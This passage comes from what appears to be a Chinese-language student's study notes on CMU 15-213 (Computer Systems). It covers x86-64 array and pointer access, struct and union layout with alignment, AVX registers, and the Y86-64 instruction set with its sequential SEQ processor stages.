]ï¼›</p><p>è¿™ä¸ªå£°æ˜æœ‰ä¸¤ä¸ªæ•ˆæœï¼šé¦–å…ˆåœ¨å†…å­˜ä¸­åˆ†é…ä¸€ä¸ªL*Nå­—èŠ‚çš„è¿ç»­åŒºåŸŸï¼Œè¿™é‡Œçš„Læ˜¯æŒ‡æ•°æ®ç±»å‹Tçš„å¤§å°ã€‚å…¶æ¬¡å¼•å…¥äº†ä¸€ä¸ªæ ‡è¯†ç¬¦Aï¼Œä½œä¸ºæŒ‡å‘æ•°ç»„å¼€å¤´çš„æŒ‡é’ˆã€‚</p><p>å‡è®¾æˆ‘ä»¬è®¿é—®ä¸€ä¸ªintæ•°ç»„ï¼ŒEçš„åœ°å€å­˜æ”¾åœ¨%rdxä¸­ï¼Œiå­˜æ”¾åœ¨%rcxä¸­ï¼Œé‚£ä¹ˆè®¿é—®<code>E[i]</code>çš„æŒ‡ä»¤ä¸ºï¼š<code>movl  (%rdx,%rcx,4), %eax</code>ã€‚</p><p>Cè¯­è¨€å…è®¸å¯¹æŒ‡é’ˆè¿›è¡Œè¿ç®—ï¼Œå…¶æ•ˆæœä¸ºå°†æŒ‡é’ˆæŒ‡å‘ä¸‹ä¸€ä¸ªæ•°æ®ç±»å‹å¤§å°çš„åœ°å€ã€‚ä¾‹å¦‚<code>*(E+1)</code>çš„æ•ˆæœç­‰åŒäº<code>E[1]</code>ã€‚ä¸‹è¡¨ç»™å‡ºäº†ä¸€äº›å¸¸è§çš„æŒ‡é’ˆè¿ç®—ï¼š</p><p><img src="/Pictures/CMU15-213/ptr.png" alt="ptr"></p><p>è¿™é‡Œéœ€è¦æ³¨æ„ï¼Œä¸¤ä¸ªæŒ‡é’ˆç›¸å‡è®¡ç®—çš„æ˜¯æŒ‡é’ˆä¹‹é—´çš„è·ç¦»ï¼Œä»¥å…ƒç´ ä¸ºå•ä½ã€‚</p><p>åŒæ ·çš„ï¼ŒåµŒå¥—æ•°ç»„åœ¨å‚¨å­˜ä¸­ä¹Ÿæ˜¯çº¿æ€§å‚¨å­˜çš„ï¼Œå³æŒ‰ç…§<strong>è¡Œä¼˜å…ˆ</strong>çš„é¡ºåºæ’åˆ—ã€‚</p><h2 id="ç»“æ„ä½“å’Œè”åˆ"><a href="#ç»“æ„ä½“å’Œè”åˆ" class="headerlink" title="ç»“æ„ä½“å’Œè”åˆ"></a>ç»“æ„ä½“å’Œè”åˆ</h2><p>ç»“æ„ä½“çš„æ‰€æœ‰ç»„æˆæˆåˆ†éƒ½å­˜æ”¾åœ¨å†…å­˜ä¸­ä¸€æ®µè¿ç»­çš„åŒºåŸŸå†…ï¼Œè€ŒæŒ‡å‘ç»“æ„çš„æŒ‡é’ˆå°±æ˜¯ç»“æ„ç¬¬ä¸€ä¸ªå­—èŠ‚çš„åœ°å€ã€‚ç¼–è¯‘å™¨æŒ‡ç¤ºæ¯ä¸ªå­—æ®µçš„å­—èŠ‚åç§»ï¼Œä»¥è¿™äº›åç§»ä½œä¸ºå†…å­˜å¼•ç”¨æŒ‡ä»¤ä¸­çš„å”¯ä¸€ï¼Œä»è€Œäº§ç”Ÿå¯¹ç»“æ„å…ƒç´ çš„å¼•ç”¨ã€‚</p><p>ä¸‹å›¾çš„ä¾‹å­å¯ä»¥å¾ˆå¥½çš„è¯´æ˜ï¼š</p><p><img src="/Pictures/CMU15-213/struct_eg.png" alt="struct_eg"></p><p>è€Œå…±ç”¨ä½“ç”¨äºå°†ä¸åŒç±»å‹çš„æ•°æ®å­˜å‚¨åœ¨åŒä¸€å—å†…å­˜ç©ºé—´ä¸­ã€‚æ‰€æœ‰æˆå‘˜å…±äº«ç›¸åŒçš„å†…å­˜ä½ç½®ã€‚</p><p><strong>å†…å­˜åˆ†é…</strong>ï¼šå…±ç”¨ä½“çš„å¤§å°æ˜¯å…¶æœ€å¤§æˆå‘˜çš„å¤§å°ï¼Œæ‰€æœ‰æˆå‘˜é‡å å­˜å‚¨åœ¨åŒä¸€å†…å­˜ç©ºé—´ä¸­ã€‚</p><p><strong>è®¿é—®</strong>ï¼šåŒä¸€æ—¶é—´åªèƒ½è®¿é—®ä¸€ä¸ªæˆå‘˜ï¼Œä¿®æ”¹ä¸€ä¸ªæˆå‘˜ä¼šå½±å“å…¶ä»–æˆå‘˜çš„å€¼ã€‚å¯ä»¥ç®€å•ç†è§£ä¸ºUnionå¯ä»¥ä½œä¸ºä»£è¡¨å®ƒå†…éƒ¨çš„ä»»ä½•ä¸€ä¸ªæˆå‘˜çš„å•ä¸ªå…ƒç´ ï¼Œè€Œç»“æ„ä½“æ˜¯åŒ…å«å†…éƒ¨æˆå‘˜çš„é›†åˆã€‚</p><p>è€ƒè™‘ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">S3</span> &#123;</span><br>    <span class="hljs-type">char</span> c;<br>    <span class="hljs-type">int</span> i[<span class="hljs-number">2</span>];<br>    <span class="hljs-type">double</span> v;<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">U3</span> &#123;</span><br>    <span class="hljs-type">char</span> c;<br>    <span class="hljs-type">int</span> i[<span class="hljs-number">2</span>];<br>    <span class="hljs-type">double</span> v;<br>&#125;;<br></code></pre></td></tr></table></figure><p>å¯ä»¥åŒæ—¶è®¿é—®S3ä¸­çš„cï¼Œiå’Œvï¼Œå› ä¸ºåœ¨ç»“æ„ä½“ä¸­è¿™ä¸‰è€…æ˜¯åŒæ—¶å­˜åœ¨çš„çš„ã€‚è€ŒU3å¯ä»¥ä½œä¸ºå…¶ä¸­ä¹‹ä¸€å‡ºç°ï¼Œä¸‰è€…ä¸æ˜¯åŒæ—¶å­˜åœ¨çš„ã€‚</p><p>å­—æ®µåç§»é‡å¦‚ä¸‹ï¼š</p><table><thead><tr><th>ç±»å‹</th><th>c</th><th>i</th><th>v</th><th>å¤§å°</th></tr></thead><tbody><tr><td>S3</td><td>0</td><td>4</td><td>16</td><td>24</td></tr><tr><td>U3</td><td>0</td><td>0</td><td>0</td><td>8</td></tr></tbody></table><p>è¿™é‡Œæ¶‰åŠåˆ°æ•°æ®å¯¹é½çš„åŸåˆ™ï¼Œå³æŸç§ç±»å‹å¯¹è±¡çš„åœ°å€å¿…é¡»æ˜¯æŸä¸ªå€¼Kï¼ˆé€šå¸¸æ˜¯2ï¼Œ4ï¼Œ8ï¼‰çš„å€æ•°ã€‚å› æ­¤åœ¨è¿™é‡Œå°½ç®¡<code>char c</code>åªå ç”¨äº†ä¸€ä¸ªå­—èŠ‚ï¼Œä½†æ˜¯içš„èµ·å§‹åœ°å€ä»ç„¶æ˜¯4.åŒæ—¶iç»“æŸåvèµ·å§‹åœ°å€åº”è¯¥æ˜¯12ï¼Œä½†ä¸ºäº†doubleçš„æ•°æ®å¯¹é½ï¼Œèµ·å§‹åœ°å€å¿…é¡»ä¸º8çš„å€æ•°ï¼Œå› æ­¤èµ·å§‹åœ°å€ä¸º16.</p><h2 id="æŒ‡é’ˆ"><a href="#æŒ‡é’ˆ" class="headerlink" title="æŒ‡é’ˆ"></a>æŒ‡é’ˆ</h2><p>æŒ‡é’ˆæ˜¯Cè¯­è¨€çš„ä¸€ä¸ªæ ¸å¿ƒç‰¹è‰²ï¼Œä»–ä»¬ä»¥ä¸€ç§ç»Ÿä¸€çš„æ–¹å¼ï¼Œå¯¹ä¸åŒçš„æ•°æ®ç»“æ„ä¸­çš„å…ƒç´ äº§ç”Ÿå¼•ç”¨ã€‚ä¸‹é¢é‡ç‚¹ä»‹ç»ä¸€äº›æŒ‡é’ˆå’Œå®ƒä»¬æ˜ å°„åˆ°æœºå™¨ä»£ç çš„å…³é”®åŸåˆ™ï¼š</p><ol><li><p>æ¯ä¸ªæŒ‡é’ˆéƒ½å¯¹åº”ä¸€ç§æ•°æ®ç±»å‹ã€‚</p><p>ç‰¹æ®ŠæŒ‡é’ˆ <code>void *</code>ç±»å‹ä»£è¡¨é€šç”¨æŒ‡é’ˆï¼Œå¯ä»¥é€šè¿‡å¼ºåˆ¶ç±»å‹è½¬æ¢æˆ–è€…èµ‹å€¼æ“ä½œé‚£æ ·çš„éšå¼å¼ºåˆ¶ç±»å‹è½¬æ¢å°†å…¶è½¬æ¢æˆä¸€ä¸ªæœ‰ç±»å‹çš„æŒ‡é’ˆã€‚æ³¨æ„<strong>æŒ‡é’ˆç±»å‹ä¸æ˜¯æœºå™¨ä»£ç ä¸­çš„ä¸€éƒ¨åˆ†ï¼Œå®ƒä»¬æ˜¯Cè¯­è¨€æä¾›çš„ä¸€ç§æŠ½è±¡ï¼Œå¸®åŠ©ç†è§£é¿å…å¯»å€é”™è¯¯</strong>ã€‚</p></li><li><p>æ¯ä¸ªæŒ‡é’ˆéƒ½æœ‰ä¸€ä¸ªå€¼ã€‚è¿™ä¸ªå€¼æ˜¯æŸä¸ªæŒ‡å®šç±»å‹å¯¹è±¡çš„åœ°å€ã€‚</p></li><li><p>æŒ‡é’ˆç”¨â€˜&amp;â€™è¿ç®—ç¬¦åˆ›å»ºã€‚&amp;è¿ç®—ç¬¦çš„æœºå™¨ä»£ç å®ç°å¸¸å¸¸åˆ©ç”¨æŒ‡ä»¤<code>leaq</code>ã€‚</p></li><li><p>â€˜*â€™æ“ä½œç¬¦ç”¨äºç®€ä»‹å¼•ç”¨æŒ‡é’ˆã€‚å…¶ç»“æœæ˜¯ä¸€ä¸ªå€¼ï¼Œç±»å‹ä¸æŒ‡é’ˆç±»å‹ä¸€è‡´ã€‚</p></li><li><p>å°†æŒ‡é’ˆä»ä¸€ç§ç±»å‹å¼ºåˆ¶è½¬æ¢ä¸ºå¦ä¸€ç§ç±»å‹ï¼Œä¸æ”¹å˜æŒ‡é’ˆçš„å€¼ã€‚</p></li><li><p>æŒ‡é’ˆå¯ä»¥æŒ‡å‘å‡½æ•°ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">fun</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> *p)</span>;<br><span class="hljs-type">int</span> (*fp)(<span class="hljs-type">int</span> ,<span class="hljs-type">int</span> *);<br>*fp = fun;<br><span class="hljs-type">int</span> y = <span class="hljs-number">1</span>;<br><span class="hljs-type">int</span> result = fp(<span class="hljs-number">3</span>, &amp;y);<br></code></pre></td></tr></table></figure><p>å‡½æ•°æŒ‡é’ˆçš„å€¼æ˜¯è¯¥å‡½æ•°æœºå™¨ä»£ç è¡¨ç¤ºä¸­ç¬¬ä¸€æ¡æŒ‡ä»¤çš„å€¼ã€‚</p></li></ol><h2 id="æµ®ç‚¹ä»£ç "><a href="#æµ®ç‚¹ä»£ç " class="headerlink" title="æµ®ç‚¹ä»£ç "></a>æµ®ç‚¹ä»£ç </h2><p>AVXæµ®ç‚¹ä½“ç³»ç»“æ„å…è®¸æ•°æ®å­˜å‚¨åœ¨16ä¸ªYMMå¯„å­˜å™¨ä¸­ï¼Œå‘½åä¸º%ymm0 $\sim$ %ymm15ï¼Œæ¯ä¸ªYMMå¯„å­˜å™¨éƒ½æ˜¯256ä½ï¼ˆ32å­—èŠ‚ï¼‰ã€‚ä½16å­—èŠ‚å‘½åä¸º%xmm0 $\sim$ %xmm15.</p><p>ç›¸åº”çš„ï¼Œæµ®ç‚¹æ“ä½œä¹ŸåŒ…æ‹¬ä¼ é€ã€è½¬æ¢ã€è¿ç®—ã€æ¯”è¾ƒç­‰ï¼Œä¸‹é¢ç›´æ¥ç»™å‡ºå¯¹åº”çš„æŒ‡ä»¤è¡¨ï¼š</p><p><img src="/Pictures/CMU15-213/vmov.png" alt="vmov"></p><p><img src="/Pictures/CMU15-213/trans.png" alt="trans"></p><p><img src="/Pictures/CMU15-213/fops.png"></p><h1 id="å¤„ç†å™¨ä½“ç³»ç»“æ„"><a href="#å¤„ç†å™¨ä½“ç³»ç»“æ„" class="headerlink" title="å¤„ç†å™¨ä½“ç³»ç»“æ„"></a>å¤„ç†å™¨ä½“ç³»ç»“æ„</h1><h2 id="Y86-64æŒ‡ä»¤é›†ä½“ç³»ç»“æ„"><a href="#Y86-64æŒ‡ä»¤é›†ä½“ç³»ç»“æ„" class="headerlink" title="Y86-64æŒ‡ä»¤é›†ä½“ç³»ç»“æ„"></a>Y86-64æŒ‡ä»¤é›†ä½“ç³»ç»“æ„</h2><p>å®šä¹‰ä¸€ä¸ªæŒ‡ä»¤é›†ä½“ç³»ç»“æ„åŒ…æ‹¬å®šä¹‰å„ç§çŠ¶æ€å•å…ƒã€æŒ‡ä»¤é›†ä»¥åŠå®ƒä»¬çš„ç¼–ç ã€ç¼–ç¨‹è§„èŒƒå’Œå¼‚å¸¸äº‹ä»¶å¤„ç†ã€‚</p><h3 id="ç¨‹åºå‘˜å¯è§çš„çŠ¶æ€"><a href="#ç¨‹åºå‘˜å¯è§çš„çŠ¶æ€" class="headerlink" title="ç¨‹åºå‘˜å¯è§çš„çŠ¶æ€"></a>ç¨‹åºå‘˜å¯è§çš„çŠ¶æ€</h3><p>Y86-64 ç¨‹åºç« ä¸­çš„æ¯æ¡æŒ‡ä»¤éƒ½ä¼šè¯»å–æˆ–ä¿®æ”¹å¤„ç†å™¨çŠ¶æ€çš„æŸäº›éƒ¨åˆ†ï¼Œè¿™ç§°ä¸ºç¨‹åºå‘˜å¯è§çŠ¶æ€ã€‚<br>ä¸€åŠè€Œè¨€ï¼Œç¨‹åºå‘˜å¯è§çš„çŠ¶æ€åŒ…æ‹¬ä»¥ä¸‹å‡ ç±»ï¼š</p><ul><li>RFï¼šç¨‹åºå¯„å­˜å™¨ã€‚åœ¨Y86-64ä¸­ï¼ŒåŒ…å«15ä¸ªç¨‹åºå¯„å­˜å™¨ï¼Œæ¯ä¸ªå­˜å‚¨ç€ä¸€ä¸ª64ä½çš„å­—ã€‚</li><li>CCï¼šæ¡ä»¶ç ï¼Œä¿å­˜ç€æœ€è¿‘çš„ç®—æ•°æˆ–é€»è¾‘æŒ‡ä»¤é€ æˆçš„ç›¸å…³å½±å“ã€‚</li><li>DMEMï¼šå†…å­˜ï¼Œä¿å­˜ç€ç¨‹åºå’Œæ•°æ®ã€‚</li><li>PCï¼šç¨‹åºè®¡æ•°å™¨ï¼Œå­˜æ”¾å½“å‰æ­£åœ¨æ‰§è¡ŒæŒ‡ä»¤çš„ç¨‹åºã€‚</li><li>Statï¼šç¨‹åºçŠ¶æ€ï¼Œè¡¨æ˜ç¨‹åºæ‰§è¡Œçš„æ€»ä½“çŠ¶æ€ã€‚</li></ul><h3 id="æŒ‡ä»¤ä»¥åŠæŒ‡ä»¤ç¼–ç "><a href="#æŒ‡ä»¤ä»¥åŠæŒ‡ä»¤ç¼–ç " class="headerlink" title="æŒ‡ä»¤ä»¥åŠæŒ‡ä»¤ç¼–ç "></a>æŒ‡ä»¤ä»¥åŠæŒ‡ä»¤ç¼–ç </h3><p><img src="/Pictures/CMU15-213/command.png" alt="command"><br>ä¸‹é¢æ˜¯ä¸€äº›ç»†èŠ‚ï¼š</p><ul><li>movqæŒ‡ä»¤è¢«ç»†åˆ†ä¸ºäº†å››ç§ï¼Œå‰ç¼€irï¼Œrrï¼Œmrï¼Œrmä»£è¡¨æºå’Œç›®çš„ã€‚</li><li>æ•´æ•°æ“ä½œæŒ‡ä»¤åªæœ‰å››ä¸ªï¼Œä¸ºaddqï¼Œsubqï¼Œandqä»¥åŠxorqã€‚</li><li>6ä¸ªæ¡ä»¶ä¼ é€æŒ‡ä»¤ï¼Œåªæœ‰å½“æ¡ä»¶ç æ»¡è¶³æ‰€éœ€è¦çš„çº¦æŸæ—¶æ‰ä¼šæ›´æ–°ç›®çš„åœ°çš„å¯„å­˜å™¨å€¼ã€‚</li><li>haltæŒ‡ä»¤åœæ­¢æŒ‡ä»¤çš„æ‰§è¡Œï¼Œå°†çŠ¶æ€ç è®¾ç½®ä¸ºHLTã€‚<br>å¯¹äºæŒ‡ä»¤åŠå…¶åˆ†æ”¯ï¼Œæˆ‘ä»¬å¯¹å…¶è¿›è¡Œç¼–ç ï¼š<br><img src="/Pictures/CMU15-213/commandEncode.png"></li></ul><p>å¯¹äºå¯„å­˜å™¨ï¼Œæˆ‘ä»¬ç”¨0x0åˆ°0xFæ¥è¡¨ç¤ºï¼Œå‰15ä¸ªä»£è¡¨å¯„å­˜å™¨ï¼Œæœ€åä¸€ä¸ªä»£è¡¨æ— å¯„å­˜å™¨ã€‚<br><img src="/Pictures/CMU15-213/Reg.png"></p><p>æœ‰ä¸€äº›æŒ‡ä»¤éœ€è¦é™„åŠ 8å­—èŠ‚å¸¸æ•°å­—ï¼Œè¿™ä¸ªå­—èƒ½å¤Ÿä½œä¸ºirmovqçš„ç«‹å³æ•°æ•°æ®ï¼Œrmmovqå’Œmrmovqçš„åœ°å€æŒ‡ç¤ºç¬¦çš„åç§»é‡ï¼Œä»¥åŠåˆ†æ”¯æŒ‡ä»¤å’Œè°ƒç”¨æŒ‡ä»¤çš„ç›®çš„åœ°å€ã€‚<br>ä¾‹å¦‚ï¼Œæˆ‘ä»¬ç”¨åå…­è¿›åˆ¶æ¥è¡¨ç¤ºæŒ‡ä»¤<code>rmmovq %rsp 0x123456789abcd(%rdx)</code>çš„å­—èŠ‚ç¼–ç ã€‚ä»å›¾ä¸­æˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼Œrmmovqçš„ç¬¬ä¸€ä¸ªå­—èŠ‚ä¸º40ï¼Œä¸¤ä¸ªå¯„å­˜å™¨æ”¾åœ¨rAå’ŒrBå­—æ®µä¸­ï¼Œè¿™é‡Œå¾—åˆ°å¯„å­˜å™¨æŒ‡ç¤ºç¬¦å­—èŠ‚42.æœ€åå°†åç§»é‡æ”¾åœ¨å…«å­—èŠ‚å¸¸æ•°å­—ä¸­ï¼Œä¸ºï¼š<br>00 01 23 45 67 89 ab cd<br>å°ç«¯æ³•ç¼–ç éœ€è¦ååºï¼šcd ab 89 67 45 23 01 00<br>æ‰€ä»¥æ•´æ®µæŒ‡ä»¤çš„ç¼–ç ï¼š40 42 cd ab 89 67 45 23 01 00.</p><h3 id="å¼‚å¸¸"><a href="#å¼‚å¸¸" class="headerlink" title="å¼‚å¸¸"></a>å¼‚å¸¸</h3><p>åœ¨y86-64æŒ‡ä»¤é›†ä¸­ï¼Œç”¨StatæŒ‡ç¤ºç¨‹åºçš„å½“å‰çŠ¶æ€ï¼š</p><table><thead><tr><th>å€¼</th><th>åå­—</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td>1</td><td>AOK</td><td>æ­£å¸¸æ“ä½œ</td></tr><tr><td>2</td><td>HLT</td><td>é‡åˆ°æ‰§è¡ŒhltæŒ‡ä»¤</td></tr><tr><td>3</td><td>ADR</td><td>é‡åˆ°éæ³•åœ°å€</td></tr><tr><td>4</td><td>INS</td><td>é‡åˆ°éæ³•æŒ‡ä»¤</td></tr></tbody></table><h3 id="ç¨‹åºå®ä¾‹"><a href="#ç¨‹åºå®ä¾‹" class="headerlink" title="ç¨‹åºå®ä¾‹"></a>ç¨‹åºå®ä¾‹</h3><p>å…ˆå†™ä¸€ä¸ªCå‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> <span class="hljs-title function_">sum</span><span class="hljs-params">(<span class="hljs-type">long</span> *start, <span class="hljs-type">long</span> count)</span><br>&#123;<br>    <span class="hljs-type">long</span> sum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>(count) &#123;<br>        sum += *start;<br>        start++;<br>        count--;<br>    &#125;<br>    <span class="hljs-keyword">return</span> sum;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯¹åº”çš„Y86-64ä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs assembly">;start in %rdi, count in %rsi<br>sum:<br>irmovq$8,%r8;Constant 8<br>irmovq$1,%r9;Constant 1<br>xorq%rax,%rax;sum = 0<br>andq%rsi,%rsi;Set CC<br>jmptest;Goto test<br>loop:<br>mrmovq(%rdi),%r10;Get *start<br>addq%r10,%rax;Add to sum<br>addq%r8,%rdi;start++<br>subq%r9,%rsi;count --<br>test:<br>jneloop;stop when 0<br>ret<br></code></pre></td></tr></table></figure><p>æ³¨æ„å‡ ä¸ªç»†èŠ‚ï¼š</p><ul><li>Y84-64å°†å¸¸æ•°åŠ è½½åˆ°å¯„å­˜å™¨ä¸­ï¼Œå› ä¸ºåœ¨ç®—æœ¯æŒ‡ä»¤ä¸­ä¸èƒ½ä½¿ç”¨ç«‹å³æ•°</li><li>è¦å®ç°ä»å†…å­˜è¯»å–ä¸€ä¸ªæ•°æ®å¹¶ç›¸åŠ ï¼ŒY84-64éœ€è¦ä¸¤æ¡æŒ‡ä»¤ã€‚</li></ul><h2 id="Y86-64-çš„é¡ºåºå®ç°"><a href="#Y86-64-çš„é¡ºåºå®ç°" class="headerlink" title="Y86-64 çš„é¡ºåºå®ç°"></a>Y86-64 çš„é¡ºåºå®ç°</h2><p>äº†è§£äº†æœ‰å…³Y86-64çš„ä¸€äº›åŸºæœ¬çŸ¥è¯†åï¼Œæˆ‘ä»¬å¯ä»¥å®ç°Y86-64.é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªç§°ä¸ºâ€œSEQâ€çš„é¡ºåºå¤„ç†å™¨ã€‚</p><p>é€šå¸¸ï¼Œå¤„ç†ä¸€æ¡æŒ‡ä»¤åŒ…æ‹¬å¾ˆå¤šæ“ä½œï¼ŒåŸºæœ¬è€Œè¨€å¯ä»¥åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªé˜¶æ®µï¼š</p><ul><li><p>å–æŒ‡ï¼ˆfetchï¼‰ï¼šä»å†…å­˜è¯»å–10æŒ‡ä»¤å­—èŠ‚ï¼Œåœ°å€ä½ç¨‹åºè®¡æ•°å™¨PCçš„å€¼ã€‚ä»æŒ‡ä»¤ä¸­æŠ½å–å‡ºæŒ‡ä»¤æŒ‡ç¤ºç¬¦å­—èŠ‚çš„ä¸¤ä¸ªå››ä½éƒ¨åˆ†ï¼Œç§°ä¸ºicodeå’Œifunï¼Œä»£è¡¨æŒ‡ä»¤ä»£ç ä¸æŒ‡ä»¤åŠŸèƒ½ã€‚è®¡ç®—ä¸‹ä¸€æŒ‡ä»¤çš„åœ°å€ä¸ºï¼š</p><p>$valp &#x3D; PC+å·²å–å‡ºæŒ‡ä»¤çš„é•¿åº¦$</p></li><li><p>è¯‘ç ï¼ˆdecodeï¼‰ï¼šä»å¯„å­˜å™¨æ–‡ä»¶è¯»å…¥æœ€å¤šä¸¤ä¸ªæ“ä½œæ•°ï¼Œå¾—åˆ°å€¼valAå’ŒvalB</p></li><li><p>æ‰§è¡Œï¼ˆexecuteï¼‰ï¼šåœ¨æ‰§è¡Œé˜¶æ®µï¼ŒALUè¦ä¹ˆæ‰§è¡ŒæŒ‡ä»¤æŒ‡æ˜çš„æ“ä½œï¼Œè®¡ç®—å†…å­˜å¼•ç”¨çš„æœ‰æ•ˆåœ°å€ï¼Œè¦ä¹ˆå¢åŠ æˆ–å‡å°‘æ ˆæŒ‡é’ˆã€‚å¾—åˆ°çš„å€¼ç§°ä¸ºvalEã€‚ä¹Ÿå¯èƒ½è®¾ç½®æ¡ä»¶ç ã€‚</p></li><li><p>è®¿å­˜ï¼ˆmemoryï¼‰ï¼šå°†æ•°æ®å†™å…¥å†…å­˜ï¼Œæˆ–è€…ä»å†…å­˜è¯»å–æ•°æ®ã€‚</p></li><li><p>å†™å›ï¼ˆwrite backï¼‰ï¼šå†™å›é˜¶æ®µæœ€å¤šå°†ä¸¤ä¸ªç»“æœå†™å›åˆ°å¯„å­˜å™¨ã€‚</p></li><li><p>æ›´æ–°PCï¼ˆPC updateï¼‰ï¼šå°†PCè®¾ç½®ä¸ºä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ã€‚</p></li></ul><p>ä¸‹é¢æˆ‘ä»¬é€šè¿‡å°†å‡ ä¸ªåŸºæœ¬æŒ‡ä»¤æŒ‰é˜¶æ®µæ‹†åˆ†æ¥è§‚å¯Ÿï¼š</p><p><img src="/Pictures/CMU15-213/exp_chp3.2.png"></p><p><img src="/Pictures/CMU15-213/jcr.png"></p><p>è¾ƒéš¾çš„æ˜¯pishqå’ŒpopqæŒ‡ä»¤ï¼š</p><table><thead><tr><th>é˜¶æ®µ</th><th>pushq rA</th><th>popq rA</th></tr></thead><tbody><tr><td>å–æŒ‡</td><td>icodeï¼šifun$\leftarrow M_1[PC]$</td><td>icodeï¼šifun$\leftarrow M_1[PC]$</td></tr><tr><td></td><td>rAï¼šrB$\leftarrow M_1[PC+1]$</td><td>rAï¼šrB$\leftarrow M_1[PC+1]$</td></tr><tr><td></td><td>valP  $\leftarrow$ PC+2</td><td>valP $\leftarrow$ PC+2</td></tr><tr><td>è¯‘ç </td><td>valA $\leftarrow$ R[rA]</td><td>valA $\leftarrow$ R[%rsp]</td></tr><tr><td></td><td>valB $\leftarrow$ R[%rsp]</td><td>valB $\leftarrow$ R[%rsp]</td></tr><tr><td>æ‰§è¡Œ</td><td>valE $\leftarrow$ valB+ï¼ˆ-8ï¼‰</td><td>valE $\leftarrow$ valB + 8</td></tr><tr><td>è®¿å­˜</td><td>M[valE]$\leftarrow$ valA</td><td>valE $\leftarrow$ M[valA]</td></tr><tr><td>å†™å›</td><td>R[%rsp]$\leftarrow$ valE</td><td>R[%rsp] $\leftarrow$ valE</td></tr><tr><td></td><td></td><td>R[rA] $\leftarrow$ valM</td></tr><tr><td>æ›´æ–°PC</td><td>PC$\leftarrow$ valP</td><td>PC$\leftarrow$valP</td></tr></tbody></table><h2 id="SEQç¡¬ä»¶ç»“æ„"><a href="#SEQç¡¬ä»¶ç»“æ„" class="headerlink" title="SEQç¡¬ä»¶ç»“æ„"></a>SEQç¡¬ä»¶ç»“æ„</h2><p><img src="/Pictures/CMU15-213/SEQ.png"></p><p>SEQçš„å®ç°åŒ…æ‹¬ç»„åˆé€»è¾‘å’Œæ—¶é’Ÿå¯„å­˜å™¨ã€éšæœºè®¿é—®å¯„å­˜å™¨ã€‚ç»„åˆé€»è¾‘ä¸éœ€è¦ä»»ä½•æ—¶åºæˆ–æ§åˆ¶ã€‚</p><p>åŸºäºä¸Šé¢çš„ç¡¬ä»¶ç»“æ„ï¼Œæˆ‘ä»¬å¯ä»¥å¯¹æ¯ä¸ªé˜¶æ®µè¿›è¡Œå…·ä½“çš„å®ç°ï¼š</p><ol><li><p>å–æŒ‡é˜¶æ®µã€‚</p><p>ä»¥PCä¸ºèµ·å§‹åœ°å€ï¼Œä»å†…å­˜ä¸­è¯»å–10ä¸ªå­—èŠ‚ï¼Œæ ¹æ®è¿™äº›å­—èŠ‚äº§ç”Ÿå„ä¸ªæŒ‡ä»¤å­—æ®µã€‚</p><p><img src="/Pictures/CMU15-213/P1.png"></p></li><li><p>è¯‘ç å’Œå†™å›ã€‚</p><p>å¯„å­˜å™¨æ–‡ä»¶æœ‰å››ä¸ªç«¯å£ï¼Œæ”¯æŒåŒæ—¶è¿›è¡Œä¸¤ä¸ªè¯»å’Œä¸¤ä¸ªå†™æ“ä½œï¼Œæ¯ä¸ªç«¯å£éƒ½æœ‰ä¸€ä¸ªåœ°å€é“¾æ¥å’Œæ•°æ®è¿æ¥ï¼Œåœ°å€é“¾æ¥æ˜¯ä¸€ä¸ªå¯„å­˜å™¨IDï¼Œè€Œæ•°æ®è¿æ¥æ˜¯ä¸€æ¡64çº¿è·¯ã€‚åœ¨è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯åœ¨è¯»å–æ—¶ éœ€è¦è¯»å–icodeä¿¡å·ï¼ŒåŸå› æ˜¯ä¸€äº›æŒ‡ä»¤ä¼šæ¶‰åŠåˆ°%rspçš„è¯»å†™æ“ä½œï¼Œé€šè¿‡icodeä¿¡å·æŒ‡ç¤ºã€‚</p><p><img src="/Pictures/CMU15-213/P2.png"></p></li><li><p>æ‰§è¡Œé˜¶æ®µã€‚</p><p>æ‰§è¡Œé˜¶æ®µALUå¯¹è¾“å…¥aluAå’ŒaluBè¿›è¡ŒADDï¼ŒSUBï¼ŒANDæˆ–XORè¿ç®—ï¼Œè®¾ç½®æ¡ä»¶ç ï¼Œå¹¶å°†ç»“æœå‚¨å­˜ä¸ºvalEè¾“å‡ºã€‚</p><p>æ ‡å·ä¸ºcondçš„ç¡¬ä»¶å•å…ƒä¼šæ ¹æ®æ¡ä»¶ç å’ŒåŠŸèƒ½ç 